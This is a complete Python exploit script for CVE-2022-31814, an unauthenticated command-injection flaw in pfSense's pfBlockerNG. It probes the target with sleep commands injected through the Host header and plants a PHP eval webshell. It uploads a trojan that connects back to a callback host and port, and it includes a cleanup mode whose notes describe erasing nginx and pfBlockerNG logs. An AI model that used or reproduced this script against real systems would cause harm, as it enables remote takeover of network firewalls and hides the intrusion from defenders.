#!/usr/bin/env python3
# ref: https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/
import requests
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse
import sys
# hardcoded for now. We have to avoid bad chars later.
# maybe a config file would be nice?
shell_code = "<?php eval($_POST[1337]);?>"
shell_fullpath = "/usr/local/www/system_advanced_control.php"
shell_webpath = "/system_advanced_control.php"
shell_param = "1337"
target_path = "/pfblockerng/www/index.php"
cleanup_script = "utils/cleanup.sh"

# opsec notes - zap these files:
# logs of webshell will be in /var/log/nginx.log
# the whole ass webshell injection command will be in /var/log/pfblockerng/dnsbl.log
# webshell injection url request will also be in /var/log/nginx.log
# exploit will auto-zap the webshell in --mode clean (and zap logs)

def touch(base_url, target_path):
    # check its a pfsense then
    # passively check the path is present and returns a GIF
    print("(+) Trying to validate the target.")
    r = requests.get(base_url, verify=False)
    if "pfSense" in r.text:
        pass
    else:
        sys.exit("(-) Don't look like any goshdarn pfSense to me.")
    r = requests.get(base_url+target_path, verify=False)
    if r.headers['content-type'] == "image/gif":
        print("(+) Correct content-type found. Run '--mode probe'")
        return True
    else:
        sys.exit("(-) Did not return the correct content-type.")

def probe(base_url, target_path):
    # actively check using a sleep difference
    # response.elapsed.total_seconds()
    print("(+) Performing active check. This WILL leave log entries.")
    target_url = base_url + target_path
    command_string_1 = "' *; sleep 1; '"
    command_string_2 = "' *; sleep 10; '"
    headers_1 = {'Host': command_string_1}
    headers_2 = {'Host': command_string_2}
    print("(+) Sending first probe request...")
    request_first = requests.get(target_url, headers=headers_1, verify=False)
    time_first = request_first.elapsed.total_seconds()
    print(f"(*) First request took {time_first} seconds")
    print("(+) Sending second probe request...")
    request_second = requests.get(target_url, headers=headers_2, verify=False)
    time_second = request_second.elapsed.total_seconds()
    print(f"(*) Second response took {time_second} seconds")
    time_difference = time_second - time_first
    if time_difference > 6:
        print(f"(*) Time difference: {time_difference}")
        print("(+) Looks like its vulnerable. Run '--mode exploit'")
        return True
    else:
        sys.exit("(-) Sleep test failed.")

def exploit(base_url, connectback_host, connectback_port, trojan, interact):
    try:
        upload_webshell(base_url, target_path)
    except:
        sys.exit("(-) Shell upload failed.")
    try:
        alive = check_execution(base_url, shell_webpath, shell_param)
        if alive == True:
            pass
        else:
            sys.exit("(-) Shell not available.")
    except:
        sys.exit("(-) Failed to check shell availability")
    print(execute_command(base_url, shell_webpath, shell_param, shell_command="id;uname -a;pwd"))
    print("(+) Uploading trojan...")
    upload_file(base_url, shell_webpath, shell_param, local_file=trojan, remote_file="/tmp/.troy")
    print("(+) Executing trojan...")
    execute_command(base_url, shell_webpath, shell_param, shell_command=f"chmod +x /tmp/.troy;CHOST={connectback_host} CPORT={connectback_port} /tmp/.troy")
    if interact == True:
        print("(-) Not implemented in this version")
    else:
        pass
    print("(!) Make sure to run '--mode cleanup' when you are done.")

def cleanup(base_url, shell_webpath, shell_param, cleanup_script):
    print("(+) Running cleanup.")
    upload_file(base_url, shell_webpath, shell_param, local_file=cleanup_script, remote_file="/tmp/.csh")
    execute_command(base_url, shell_webpath, shell_param, shell_command="sh /tmp/.csh")

def check_execution(base_url, shell_webpath, shell_param):
    print("(+) Checking for our webshell...")
    # returns True or False, used to check the shell status
    php_code = "echo md5('hacktheplanet');"
    output = execute_php(base_url, shell_webpath, shell_param, php_code)
    if "254e5f2c3beb1a3d03f17253c15c07f3" not in output:
        print("(-) Shell not working")
        return False
    elif "254e5f2c3beb1a3d03f17253c15c07f3" in output:
        print("(+) Shell works!")
        return True
    else: # why am I here?
        print("(-) Shell not working")
        return False 

def execute_php(base_url, shell_webpath, shell_param, php_code):
    # run php via webshell
    shell_url = base_url + shell_webpath
    data = {shell_param: php_code}
    r = requests.post(shell_url, data, verify=False)
    return r.text

def upload_webshell(base_url, target_path):
    print("(+) Using command injection bug to inject webshell")
    php_code = f"<?$a=fopen(\"{shell_fullpath}\",\"w\") or die();$t='{shell_code}';fwrite($a,$t);fclose( $a);?>"
    encoded_php = base64.b64encode(php_code.encode('ascii'))
    command_string = f"' *; echo '{encoded_php.decode('ascii')}'|python3.8 -m base64 -d | php; '"
    headers = {'Host': command_string}
    target_url = base_url + target_path
    r = requests.get(target_url, headers=headers, verify=False)

def upload_file(base_url, shell_webpath, shell_param, local_file, remote_file):
    # uploads a file from local to remote
    raw_php = f"move_uploaded_file($_FILES['uploaded_file']['tmp_name'], '{remote_file}');"
    php_bytes_uploader = raw_php.encode('ascii')
    files = {'uploaded_file': open(local_file, "rb")}
    data = {shell_param: php_bytes_uploader}
    shell_url = base_url + shell_webpath
    r = requests.post(shell_url, data=data, files=files, verify=False)
    return r.text

def execute_command(base_url, shell_webpath, shell_param, shell_command):
    # executes a shell command using execute_php
    php_code = f"system('{shell_command}');" 
    output = execute_php(base_url, shell_webpath, shell_param, php_code)
    return output

def delete_webshell(base_url, shell_webpath, shell_param, shell_fullpath):
    shell_command = f"rm -rf {shell_fullpath}"
    print("(!) Deleting webshell!")
    execute_command(base_url, shell_webpath, shell_param, shell_command) 

def main():
    parser = argparse.ArgumentParser(description="CVE-2022-31814: Who will do something about this senseless violence?")
    parser.add_argument('--target', help="Target Host, eg: https://pfsense.local", required=True)
    parser.add_argument('--mode', help="Mode: probe, touch, exploit or cleanup.", choices=["touch", "probe", "exploit", "cleanup"], required=True)
    parser.add_argument('--interact', help="In exploit mode, spawns a pseudo-shell with file transfer capabilities.", default=False)
    parser.add_argument('--trojan', help="The implant to upload and execute", default="utils/trojan")
    parser.add_argument('--cbhost', help="Callback host for implant")
    parser.add_argument('--cbport', help="Callback port for implant")
    args = parser.parse_args()
    if args.mode == "touch":
        touch(base_url=args.target, target_path=target_path)
    elif args.mode == "probe":
        probe(base_url=args.target, target_path=target_path)
    elif args.mode == "exploit":
        if not args.cbhost:
            sys.exit("(!) You forgot to set the --cbhost")
        if not args.cbport:
            sys.exit("(!) You forgot to set the --cbport")
        else:
            print(f"(+) Using trojan: {args.trojan}")
            print(f"(+) Trojan is phoning home to: {args.cbhost}:{args.cbport}")
            exploit(base_url=args.target, connectback_host=args.cbhost, connectback_port=args.cbport, trojan=args.trojan, interact=args.interact)
    elif args.mode == "cleanup":
        cleanup(base_url=args.target, shell_webpath=shell_webpath, shell_param=shell_param, cleanup_script=cleanup_script)

if __name__ == "__main__":
    main()
